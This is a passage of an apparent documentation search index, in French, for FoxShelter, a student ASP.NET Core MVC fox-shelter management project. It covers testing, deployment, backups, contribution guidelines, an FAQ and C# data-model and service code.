couverture\ndotnet test --collect:\"XPlat Code Coverage\"\n\n# Tests sp\u00e9cifiques\ndotnet test --filter \"Category=Unit\"\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#tests-dintegration","title":"Tests d'Int\u00e9gration","text":"<pre><code># Tests d'int\u00e9gration\ndotnet test --filter \"Category=Integration\"\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#structure-des-tests","title":"Structure des Tests","text":"<pre><code>FoxShelter.Tests/\n\u251c\u2500\u2500 Unit/\n\u2502   \u251c\u2500\u2500 Services/\n\u2502   \u251c\u2500\u2500 Controllers/\n\u2502   \u2514\u2500\u2500 Models/\n\u251c\u2500\u2500 Integration/\n\u2502   \u251c\u2500\u2500 Api/\n\u2502   \u2514\u2500\u2500 Database/\n\u2514\u2500\u2500 Fixtures/\n    \u2514\u2500\u2500 TestData/\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#deploiement","title":"\ud83d\ude80 D\u00e9ploiement","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#deploiement-local-iis","title":"D\u00e9ploiement Local (IIS)","text":"<ol> <li> <p>Publier l'application : <pre><code>dotnet publish -c Release -o ./publish\n</code></pre></p> </li> <li> <p>Configurer IIS :</p> </li> <li>Cr\u00e9er un nouveau site web</li> <li>Pointer vers le dossier <code>publish</code></li> <li> <p>Configurer le pool d'applications (.NET Core)</p> </li> <li> <p>Configurer la base de donn\u00e9es :</p> </li> <li>Cr\u00e9er la base de donn\u00e9es de production</li> <li>Ex\u00e9cuter les migrations</li> <li>Configurer la cha\u00eene de connexion</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#deploiement-azure","title":"D\u00e9ploiement Azure","text":"<ol> <li> <p>Azure App Service : <pre><code># Publier vers Azure\ndotnet publish -c Release\naz webapp deploy --resource-group myResourceGroup --name myapp --src-path ./bin/Release/net8.0/publish.zip\n</code></pre></p> </li> <li> <p>Azure SQL Database :</p> </li> <li>Cr\u00e9er une base Azure SQL</li> <li>Configurer le firewall</li> <li>Mettre \u00e0 jour la cha\u00eene de connexion</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#deploiement-docker","title":"D\u00e9ploiement Docker","text":"<pre><code>FROM mcr.microsoft.com/dotnet/aspnet:8.0 AS base\nWORKDIR /app\nEXPOSE 80\nEXPOSE 443\n\nFROM mcr.microsoft.com/dotnet/sdk:8.0 AS build\nWORKDIR /src\nCOPY [\"FoxShelter.csproj\", \".\"]\nRUN dotnet restore \"./FoxShelter.csproj\"\nCOPY . .\nWORKDIR \"/src/.\"\nRUN dotnet build \"FoxShelter.csproj\" -c Release -o /app/build\n\nFROM build AS publish\nRUN dotnet publish \"FoxShelter.csproj\" -c Release -o /app/publish\n\nFROM base AS final\nWORKDIR /app\nCOPY --from=publish /app/publish .\nENTRYPOINT [\"dotnet\", \"FoxShelter.dll\"]\n</code></pre> <pre><code># Construire l'image\ndocker build -t foxshelter .\n\n# Lancer le conteneur\ndocker run -d -p 8080:80 --name foxshelter-app foxshelter\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#maintenance","title":"\ud83d\udd27 Maintenance","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#sauvegardes","title":"Sauvegardes","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#base-de-donnees","title":"Base de Donn\u00e9es","text":"<pre><code>-- Sauvegarde compl\u00e8te\nBACKUP DATABASE FoxShelterDB \nTO DISK = 'C:\\Backups\\FoxShelter_Full.bak'\n\n-- Sauvegarde diff\u00e9rentielle\nBACKUP DATABASE FoxShelterDB \nTO DISK = 'C:\\Backups\\FoxShelter_Diff.bak'\nWITH DIFFERENTIAL\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#fichiers-application","title":"Fichiers Application","text":"<ul> <li>Sauvegarder le dossier <code>wwwroot/uploads</code></li> <li>Sauvegarder les fichiers de configuration</li> <li>Sauvegarder les logs</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#monitoring","title":"Monitoring","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#logs","title":"Logs","text":"<pre><code>// Configuration dans Program.cs\nbuilder.Logging.AddFile(\"Logs/foxshelter-{Date}.txt\");\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#metriques","title":"M\u00e9triques","text":"<ul> <li>Temps de r\u00e9ponse des pages</li> <li>Utilisation de la base de donn\u00e9es</li> <li>Erreurs applicatives</li> <li>Utilisation m\u00e9moire</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#mises-a-jour","title":"Mises \u00e0 Jour","text":"<ol> <li>Sauvegarder l'application et la base de donn\u00e9es</li> <li>Tester en environnement de d\u00e9veloppement</li> <li>D\u00e9ployer en mode maintenance</li> <li>V\u00e9rifier le bon fonctionnement</li> <li>Remettre en service</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#contribution","title":"\ud83e\udd1d Contribution","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#standards-de-code","title":"Standards de Code","text":"<ul> <li>Conventions C# : PascalCase pour les classes et m\u00e9thodes</li> <li>Commentaires : Documentation XML pour les m\u00e9thodes publiques</li> <li>Tests : Couverture minimale de 80%</li> <li>Git : Messages de commit descriptifs</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#processus-de-contribution","title":"Processus de Contribution","text":"<ol> <li>Fork le projet</li> <li>Cr\u00e9er une branche feature</li> <li>D\u00e9velopper avec tests</li> <li>Tester localement</li> <li>Soumettre une pull request</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/#structure-des-commits","title":"Structure des Commits","text":"<pre><code>type(scope): description\n\nfeat(renards): ajouter recherche par esp\u00e8ce\nfix(soins): corriger calcul des co\u00fbts\ndocs(readme): mettre \u00e0 jour installation\ntest(services): ajouter tests unitaires\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/#support","title":"\ud83d\udcde Support","text":""},{"location":"BTS/B2/FoxShelter/Documentation/#documentation","title":"Documentation","text":"<ul> <li>README : Ce fichier</li> <li>Wiki : Documentation d\u00e9taill\u00e9e</li> <li>API Docs : Documentation Swagger</li> <li>Diagrammes UML : Architecture technique</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#contact","title":"Contact","text":"<ul> <li>Email : support@foxshelter.fr</li> <li>Issues : GitHub Issues</li> <li>Discussions : GitHub Discussions</li> </ul>"},{"location":"BTS/B2/FoxShelter/Documentation/#faq","title":"FAQ","text":"<p>Q: Comment r\u00e9initialiser la base de donn\u00e9es ? <pre><code>dotnet ef database drop\ndotnet ef database update\n</code></pre></p> <p>Q: Comment ajouter de nouvelles donn\u00e9es de test ? Modifier la m\u00e9thode <code>SeedData()</code> dans <code>FoxShelterContext.cs</code></p> <p>Q: Comment changer le th\u00e8me de l'interface ? Modifier les variables CSS dans <code>wwwroot/css/site.css</code></p> <p>Q: Comment configurer les emails ? Ajouter la configuration SMTP dans <code>appsettings.json</code></p>"},{"location":"BTS/B2/FoxShelter/Documentation/#licence","title":"\ud83d\udcc4 Licence","text":"<p>Ce projet est d\u00e9velopp\u00e9 dans un cadre p\u00e9dagogique pour le BTS SIO 1 SLAM.</p>"},{"location":"BTS/B2/FoxShelter/Documentation/#remerciements","title":"\ud83d\ude4f Remerciements","text":"<ul> <li>\u00c9quipe p\u00e9dagogique BTS SIO</li> <li>Communaut\u00e9 .NET pour les ressources</li> <li>Refuges animaliers pour l'inspiration</li> </ul> <p>Derni\u00e8re mise \u00e0 jour : Janvier 2024</p>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/","title":"Documentation Technique FoxShelter","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#table-des-matieres","title":"\ud83d\udccb Table des Mati\u00e8res","text":"<ol> <li>Architecture G\u00e9n\u00e9rale</li> <li>Mod\u00e8le de Donn\u00e9es</li> <li>Couches Applicatives</li> <li>Services et Logique M\u00e9tier</li> <li>API et Endpoints</li> <li>S\u00e9curit\u00e9</li> <li>Performance et Optimisation</li> <li>Patterns et Bonnes Pratiques</li> <li>Tests</li> <li>D\u00e9ploiement</li> <li>Monitoring et Logs</li> <li>\u00c9volutions Futures</li> </ol>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#architecture-generale","title":"\ud83c\udfd7\ufe0f Architecture G\u00e9n\u00e9rale","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#vue-densemble","title":"Vue d'Ensemble","text":"<p>FoxShelter suit une architecture MVC (Model-View-Controller) avec une s\u00e9paration claire des responsabilit\u00e9s :</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Pr\u00e9sentation  \u2502    \u2502  Logique M\u00e9tier \u2502    \u2502  Acc\u00e8s Donn\u00e9es  \u2502\n\u2502                 \u2502    \u2502                 \u2502    \u2502                 \u2502\n\u2502  Controllers    \u2502\u25c4\u2500\u2500\u25ba\u2502    Services     \u2502\u25c4\u2500\u2500\u25ba\u2502 Entity Framework\u2502\n\u2502  Views          \u2502    \u2502  Business Logic \u2502    \u2502  SQL Server     \u2502\n\u2502  ViewModels     \u2502    \u2502  Validation     \u2502    \u2502  Repository     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#technologies-utilisees","title":"Technologies Utilis\u00e9es","text":"Couche Technologie Version R\u00f4le Frontend HTML5, CSS3, JavaScript - Interface utilisateur Framework CSS Bootstrap 5.3 Responsive design Backend ASP.NET Core MVC 8.0 Framework web Langage C# 12.0 Logique applicative ORM Entity Framework Core 8.0 Acc\u00e8s aux donn\u00e9es Base de donn\u00e9es SQL Server 2022 Persistance Injection de d\u00e9pendances Microsoft.Extensions.DI 8.0 IoC Container"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#structure-du-projet","title":"Structure du Projet","text":"<pre><code>FoxShelter/\n\u251c\u2500\u2500 Controllers/              # Contr\u00f4leurs MVC\n\u2502   \u251c\u2500\u2500 HomeController.cs     # Page d'accueil\n\u2502   \u2514\u2500\u2500 RenardController.cs   # Gestion des renards\n\u251c\u2500\u2500 Models/                   # Mod\u00e8les de donn\u00e9es\n\u2502   \u251c\u2500\u2500 Entities/            # Entit\u00e9s m\u00e9tier\n\u2502   \u2502   \u251c\u2500\u2500 Renard.cs\n\u2502   \u2502   \u251c\u2500\u2500 Personne.cs\n\u2502   \u2502   \u251c\u2500\u2500 Employe.cs\n\u2502   \u2502   \u251c\u2500\u2500 Benevole.cs\n\u2502   \u2502   \u251c\u2500\u2500 SoinVeterinaire.cs\n\u2502   \u2502   \u251c\u2500\u2500 RegimeAlimentaire.cs\n\u2502   \u2502   \u2514\u2500\u2500 Don.cs\n\u2502   \u251c\u2500\u2500 Enums/              # \u00c9num\u00e9rations\n\u2502   \u2502   \u251c\u2500\u2500 EtatSante.cs\n\u2502   \u2502   \u251c\u2500\u2500 TypeSoin.cs\n\u2502   \u2502   \u2514\u2500\u2500 TypeDon.cs\n\u2502   \u2514\u2500\u2500 ViewModels/         # Mod\u00e8les de vue\n\u2502       \u251c\u2500\u2500 AccueilViewModel.cs\n\u2502       \u2514\u2500\u2500 ErrorViewModel.cs\n\u251c\u2500\u2500 Views/                  # Vues Razor\n\u2502   \u251c\u2500\u2500 Home/\n\u2502   \u251c\u2500\u2500 Renard/\n\u2502   \u2514\u2500\u2500 Shared/\n\u251c\u2500\u2500 Services/               # Services m\u00e9tier\n\u2502   \u2514\u2500\u2500 RenardService.cs\n\u251c\u2500\u2500 Data/                   # Contexte EF\n\u2502   \u2514\u2500\u2500 FoxShelterContext.cs\n\u251c\u2500\u2500 wwwroot/               # Ressources statiques\n\u2502   \u251c\u2500\u2500 css/\n\u2502   \u251c\u2500\u2500 js/\n\u2502   \u2514\u2500\u2500 images/\n\u251c\u2500\u2500 Diagrammes/            # Documentation UML\n\u251c\u2500\u2500 Documentation/         # Documentation technique\n\u251c\u2500\u2500 Program.cs             # Point d'entr\u00e9e\n\u251c\u2500\u2500 appsettings.json       # Configuration\n\u2514\u2500\u2500 FoxShelter.csproj     # Fichier projet\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#modele-de-donnees","title":"\ud83d\uddc4\ufe0f Mod\u00e8le de Donn\u00e9es","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#diagramme-entite-relation","title":"Diagramme Entit\u00e9-Relation","text":"<pre><code>erDiagram\n    RENARD {\n        int Id PK\n        string Nom\n        string Espece\n        int Age\n        char Sexe\n        decimal Poids\n        EtatSante EtatSante\n        DateTime DateArrivee\n        bool EstAdopte\n        DateTime DateAdoption\n        string Observations\n        int RegimeAlimentaireId FK\n    }\n\n    PERSONNE {\n        int Id PK\n        string Nom\n        string Prenom\n        string Email\n        string Telephone\n        string Adresse\n        DateTime DateNaissance\n    }\n\n    EMPLOYE {\n        int Id PK\n        decimal Salaire\n        DateTime DateEmbauche\n        string Poste\n        bool EstVeterinaire\n    }\n\n    BENEVOLE {\n        int Id PK\n        DateTime DateInscription\n        int HeuresBenevolat\n        string Competences\n        bool EstActif\n    }\n\n    SOIN_VETERINAIRE {\n        int Id PK\n        int RenardId FK\n        int VeterinaireId FK\n        DateTime DateSoin\n        TypeSoin TypeSoin\n        string Description\n        decimal Cout\n        string Medicaments\n        DateTime ProchainRendezVous\n    }\n\n    REGIME_ALIMENTAIRE {\n        int Id PK\n        string Nom\n        string Description\n        decimal CoutJournalier\n        bool AdapteAge\n        bool RegimeMedical\n    }\n\n    DON {\n        int Id PK\n        int DonateurId FK\n        TypeDon TypeDon\n        decimal Montant\n        DateTime DateDon\n        string Description\n        bool RecuFiscal\n        bool DonRecurrent\n    }\n\n    RENARD ||--|| REGIME_ALIMENTAIRE : suit\n    RENARD ||--o{ SOIN_VETERINAIRE : recoit\n    PERSONNE ||--o| EMPLOYE : est\n    PERSONNE ||--o| BENEVOLE : est\n    EMPLOYE ||--o{ SOIN_VETERINAIRE : effectue\n    PERSONNE ||--o{ DON : fait\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#entites-principales","title":"Entit\u00e9s Principales","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#renard","title":"Renard","text":"<pre><code>public class Renard\n{\n    public int Id { get; set; }\n    public string Nom { get; set; }\n    public string Espece { get; set; }\n    public int Age { get; set; }\n    public char Sexe { get; set; }\n    public decimal Poids { get; set; }\n    public EtatSante EtatSante { get; set; }\n    public DateTime DateArrivee { get; set; }\n    public bool EstAdopte { get; set; }\n    public DateTime? DateAdoption { get; set; }\n    public string? Observations { get; set; }\n\n    // Relations\n    public int RegimeAlimentaireId { get; set; }\n    public RegimeAlimentaire RegimeAlimentaire { get; set; }\n    public ICollection&lt;SoinVeterinaire&gt; SoinsVeterinaires { get; set; }\n\n    // Propri\u00e9t\u00e9s calcul\u00e9es\n    public int DureeSejourJours =&gt; (DateTime.Now - DateArrivee).Days;\n    public bool NecessiteSuiviUrgent =&gt; EtatSante == EtatSante.Critique || EtatSante == EtatSante.Blesse;\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#personne-classe-abstraite","title":"Personne (Classe Abstraite)","text":"<pre><code>public abstract class Personne\n{\n    public int Id { get; set; }\n    public string Nom { get; set; }\n    public string Prenom { get; set; }\n    public string Email { get; set; }\n    public string Telephone { get; set; }\n    public string Adresse { get; set; }\n    public DateTime DateNaissance { get; set; }\n\n    // Propri\u00e9t\u00e9 calcul\u00e9e\n    public int Age =&gt; DateTime.Now.Year - DateNaissance.Year;\n    public string NomComplet =&gt; $\"{Prenom} {Nom}\";\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#enumerations","title":"\u00c9num\u00e9rations","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#etatsante","title":"EtatSante","text":"<pre><code>public enum EtatSante\n{\n    Excellent = 1,\n    Bon = 2,\n    Moyen = 3,\n    Faible = 4,\n    Blesse = 5,\n    Critique = 6\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#typesoin","title":"TypeSoin","text":"<pre><code>public enum TypeSoin\n{\n    Consultation = 1,\n    Vaccination = 2,\n    Chirurgie = 3,\n    Traitement = 4,\n    Urgence = 5,\n    Suivi = 6\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#contraintes-et-validations","title":"Contraintes et Validations","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#annotations-de-validation","title":"Annotations de Validation","text":"<pre><code>public class Renard\n{\n    [Required(ErrorMessage = \"Le nom est obligatoire\")]\n    [StringLength(50, ErrorMessage = \"Le nom ne peut pas d\u00e9passer 50 caract\u00e8res\")]\n    public string Nom { get; set; }\n\n    [Range(0, 20, ErrorMessage = \"L'\u00e2ge doit \u00eatre entre 0 et 20 ans\")]\n    public int Age { get; set; }\n\n    [Range(0.1, 50.0, ErrorMessage = \"Le poids doit \u00eatre entre 0.1 et 50 kg\")]\n    public decimal Poids { get; set; }\n\n    [RegularExpression(\"^[MF]$\", ErrorMessage = \"Le sexe doit \u00eatre M ou F\")]\n    public char Sexe { get; set; }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#configuration-entity-framework","title":"Configuration Entity Framework","text":"<pre><code>protected override void OnModelCreating(ModelBuilder modelBuilder)\n{\n    // Configuration Renard\n    modelBuilder.Entity&lt;Renard&gt;(entity =&gt;\n    {\n        entity.HasKey(e =&gt; e.Id);\n        entity.Property(e =&gt; e.Nom).IsRequired().HasMaxLength(50);\n        entity.Property(e =&gt; e.Espece).IsRequired().HasMaxLength(100);\n        entity.Property(e =&gt; e.Poids).HasPrecision(5, 2);\n        entity.Property(e =&gt; e.Sexe).HasMaxLength(1);\n\n        // Index pour les recherches fr\u00e9quentes\n        entity.HasIndex(e =&gt; e.Nom);\n        entity.HasIndex(e =&gt; e.EtatSante);\n        entity.HasIndex(e =&gt; e.EstAdopte);\n    });\n\n    // Relations\n    modelBuilder.Entity&lt;Renard&gt;()\n        .HasOne(r =&gt; r.RegimeAlimentaire)\n        .WithMany()\n        .HasForeignKey(r =&gt; r.RegimeAlimentaireId);\n\n    modelBuilder.Entity&lt;SoinVeterinaire&gt;()\n        .HasOne(s =&gt; s.Renard)\n        .WithMany(r =&gt; r.SoinsVeterinaires)\n        .HasForeignKey(s =&gt; s.RenardId);\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#couches-applicatives","title":"\ud83c\udfdb\ufe0f Couches Applicatives","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#1-couche-presentation","title":"1. Couche Pr\u00e9sentation","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#controleurs","title":"Contr\u00f4leurs","text":"<pre><code>[Route(\"[controller]\")]\npublic class RenardController : Controller\n{\n    private readonly RenardService _renardService;\n    private readonly ILogger&lt;RenardController&gt; _logger;\n\n    public RenardController(RenardService renardService, ILogger&lt;RenardController&gt; logger)\n    {\n        _renardService = renardService;\n        _logger = logger;\n    }\n\n    [HttpGet]\n    public async Task&lt;IActionResult&gt; Index(string recherche = \"\", EtatSante? etatSante = null)\n    {\n        try\n        {\n            var renards = await _renardService.ObtenirRenardsAsync(recherche, etatSante);\n            return View(renards);\n        }\n        catch (Exception ex)\n        {\n            _logger.LogError(ex, \"Erreur lors de la r\u00e9cup\u00e9ration des renards\");\n            return View(\"Error\");\n        }\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#viewmodels","title":"ViewModels","text":"<pre><code>public class AccueilViewModel\n{\n    public int NombreTotalRenards { get; set; }\n    public int RenardsCritiques { get; set; }\n    public int RenardsAdoptesRecemment { get; set; }\n    public decimal TauxAdoption { get; set; }\n    public List&lt;Renard&gt; RenardsUrgents { get; set; }\n    public List&lt;Renard&gt; NouveauxArrivants { get; set; }\n    public List&lt;Renard&gt; RenardsSuivi { get; set; }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#2-couche-logique-metier","title":"2. Couche Logique M\u00e9tier","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#services","title":"Services","text":"<pre><code>public class RenardService\n{\n    private readonly FoxShelterContext _context;\n    private readonly ILogger&lt;RenardService&gt; _logger;\n\n    public RenardService(FoxShelterContext context, ILogger&lt;RenardService&gt; logger)\n    {\n        _context = context;\n        _logger = logger;\n    }\n\n    public async Task&lt;List&lt;Renard&gt;&gt; ObtenirRenardsAsync(string recherche = \"\", EtatSante? etatSante = null)\n    {\n        var query = _context.Renards\n            .Include(r =&gt; r.RegimeAlimentaire)\n            .AsQueryable();\n\n        if (!string.IsNullOrEmpty(recherche))\n        {\n            query = query.Where(r =&gt; r.Nom.Contains(recherche) || r.Espece.Contains(recherche));\n        }\n\n        if (etatSante.HasValue)\n        {\n            query = query.Where(r =&gt; r.EtatSante == etatSante.Value);\n        }\n\n        return await query.OrderBy(r =&gt; r.Nom).ToListAsync();\n    }\n\n    public async Task&lt;bool&gt; MarquerCommeAdopteAsync(int renardId)\n    {\n        var renard = await _context.Renards.FindAsync(renardId);\n        if (renard == null) return false;\n\n        renard.EstAdopte = true;\n        renard.DateAdoption = DateTime.Now;\n\n        await _context.SaveChangesAsync();\n        _logger.LogInformation($\"Renard {renard.Nom} marqu\u00e9 comme adopt\u00e9\");\n\n        return true;\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#3-couche-acces-aux-donnees","title":"3. Couche Acc\u00e8s aux Donn\u00e9es","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#contexte-entity-framework","title":"Contexte Entity Framework","text":"<pre><code>public class FoxShelterContext : DbContext\n{\n    public FoxShelterContext(DbContextOptions&lt;FoxShelterContext&gt; options) : base(options) { }\n\n    public DbSet&lt;Renard&gt; Renards { get; set; }\n    public DbSet&lt;Personne&gt; Personnes { get; set; }\n    public DbSet&lt;Employe&gt; Employes { get; set; }\n    public DbSet&lt;Benevole&gt; Benevoles { get; set; }\n    public DbSet&lt;SoinVeterinaire&gt; SoinsVeterinaires { get; set; }\n    public DbSet&lt;RegimeAlimentaire&gt; RegimesAlimentaires { get; set; }\n    public DbSet&lt;Don&gt; Dons { get; set; }\n\n    protected override void OnModelCreating(ModelBuilder modelBuilder)\n    {\n        // Configuration des entit\u00e9s\n        ConfigurerRenard(modelBuilder);\n        ConfigurerPersonne(modelBuilder);\n        ConfigurerSoinVeterinaire(modelBuilder);\n\n        // Donn\u00e9es de test\n        SeedData(modelBuilder);\n    }\n\n    private void SeedData(ModelBuilder modelBuilder)\n    {\n        // R\u00e9gimes alimentaires par d\u00e9faut\n        modelBuilder.Entity&lt;RegimeAlimentaire&gt;().HasData(\n            new RegimeAlimentaire { Id = 1, Nom = \"Standard\", Description = \"R\u00e9gime \u00e9quilibr\u00e9 pour renard adulte\", CoutJournalier = 5.50m },\n            new RegimeAlimentaire { Id = 2, Nom = \"Jeune\", Description = \"R\u00e9gime riche pour renardeau\", CoutJournalier = 7.00m },\n            new RegimeAlimentaire { Id = 3, Nom = \"M\u00e9dical\", Description = \"R\u00e9gime sp\u00e9cialis\u00e9 pour convalescence\", CoutJournalier = 12.00m }\n        );\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#services-et-logique-metier","title":"\ud83d\udd27 Services et Logique M\u00e9tier","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#architecture-des-services","title":"Architecture des Services","text":"<pre><code>public interface IRenardService\n{\n    Task&lt;List&lt;Renard&gt;&gt; ObtenirRenardsAsync(string recherche = \"\", EtatSante? etatSante = null);\n    Task&lt;Renard&gt; ObtenirRenardParIdAsync(int id);\n    Task&lt;Renard&gt; CreerRenardAsync(Renard renard);\n    Task&lt;bool&gt; ModifierRenardAsync(Renard renard);\n    Task&lt;bool&gt; SupprimerRenardAsync(int id);\n    Task&lt;bool&gt; MarquerCommeAdopteAsync(int renardId);\n    Task&lt;List&lt;Renard&gt;&gt; ObtenirRenardsUrgentsAsync();\n    Task&lt;StatistiquesRenards&gt; ObtenirStatistiquesAsync();\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#implementation-des-services","title":"Impl\u00e9mentation des Services","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#renardservice-complet","title":"RenardService Complet","text":"<pre><code>public class RenardService : IRenardService\n{\n    private readonly FoxShelterContext _context;\n    private readonly ILogger&lt;RenardService&gt; _logger;\n\n    public RenardService(FoxShelterContext context, ILogger&lt;RenardService&gt; logger)\n    {\n        _context = context;\n        _logger = logger;\n    }\n\n    public async Task&lt;List&lt;Renard&gt;&gt; ObtenirRenardsAsync(string recherche = \"\", EtatSante? etatSante = null)\n    {\n        try\n        {\n            var query = _context.Renards\n                .Include(r =&gt; r.RegimeAlimentaire)\n                .AsQueryable();\n\n            if (!string.IsNullOrEmpty(recherche))\n            {\n                query = query.Where(r =&gt; \n                    r.Nom.Contains(recherche) || \n                    r.Espece.Contains(recherche) ||\n                    r.Observations.Contains(recherche));\n            }\n\n            if (etatSante.HasValue)\n            {\n                query = query.Where(r =&gt; r.EtatSante == etatSante.Value);\n            }\n\n            return await query\n                .OrderBy(r =&gt; r.EstAdopte)\n                .ThenByDescending(r =&gt; r.DateArrivee)\n                .ToListAsync();\n        }\n        catch (Exception ex)\n        {\n            _logger.LogError(ex, \"Erreur lors de la r\u00e9cup\u00e9ration des renards\");\n            throw;\n        }\n    }\n\n    public async Task&lt;Renard&gt; CreerRenardAsync(Renard renard)\n    {\n        try\n        {\n            // Validation m\u00e9tier\n            if (await _context.Renards.AnyAsync(r =&gt; r.Nom == renard.Nom &amp;&amp; !r.EstAdopte))\n            {\n                throw new InvalidOperationException(\"Un renard avec ce nom existe d\u00e9j\u00e0 dans le refuge\");\n            }\n\n            renard.DateArrivee = DateTime.Now;\n            renard.EstAdopte = false;\n\n            _context.Renards.Add(renard);\n            await _context.SaveChangesAsync();\n\n            _logger.LogInformation($\"Nouveau renard cr\u00e9\u00e9 : {renard.Nom} (ID: {renard.Id})\");\n            return renard;\n        }\n        catch (Exception ex)\n        {\n            _logger.LogError(ex, $\"Erreur lors de la cr\u00e9ation du renard {renard.Nom}\");\n            throw;\n        }\n    }\n\n    public async Task&lt;StatistiquesRenards&gt; ObtenirStatistiquesAsync()\n    {\n        var stats = new StatistiquesRenards\n        {\n            NombreTotal = await _context.Renards.CountAsync(),\n            NombreAdoptes = await _context.Renards.CountAsync(r =&gt; r.EstAdopte),\n            NombreCritiques = await _context.Renards.CountAsync(r =&gt; r.EtatSante == EtatSante.Critique),\n            NouveauxCeMois = await _context.Renards.CountAsync(r =&gt; \n                r.DateArrivee.Month == DateTime.Now.Month &amp;&amp; \n                r.DateArrivee.Year == DateTime.Now.Year),\n            AdoptesCeMois = await _context.Renards.CountAsync(r =&gt; \n                r.EstAdopte &amp;&amp; \n                r.DateAdoption.HasValue &amp;&amp;\n                r.DateAdoption.Value.Month == DateTime.Now.Month &amp;&amp; \n                r.DateAdoption.Value.Year == DateTime.Now.Year)\n        };\n\n        stats.TauxAdoption = stats.NombreTotal &gt; 0 ? \n            (decimal)stats.NombreAdoptes / stats.NombreTotal * 100 : 0;\n\n        return stats;\n    }\n}\n</code></pre>"},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#gestion-des-erreurs","title":"Gestion des Erreurs","text":""},{"location":"BTS/B2/FoxShelter/Documentation/DocumentationTechnique/#exception-handling-global","title":"Exception Handling Global","text":"<pre><code>public class GlobalExceptionMiddleware\n{\n    private readonly RequestDelegate _next;\n    private readonly ILogger&lt;GlobalExceptionMiddleware&gt; _logger;\n\n    public GlobalExceptionMiddleware(RequestDelegate next, ILogger&lt;GlobalExceptionMiddleware&gt; logger)\n    {\n        _next = next;\n        _logger = logger;\n    }\n\n    public async Task InvokeAsync(HttpContext context)\n    {\n        try\n        {\n            await _next(context);\n        }\n        catch (Exception ex)\n        {\n            _logger.LogError(ex, \"Une erreur non g\u00e9r\u00e9e s'est produite\");\n            await HandleExceptionAsync(context, ex);\n        }\n    }\n\n    private static async Task HandleExceptionAsync(HttpContext context, Exception exception)\n    {\n        context.Response.StatusCode = exception switch\n        {\n            ArgumentNullException =&gt; 400,\n            InvalidOperationException =&gt; 400,\n            UnauthorizedAccessException =&gt; 401,\n            _ =&gt; 500\n        };\n\n        var response = new\n        {\n            error = exception.Message,\n            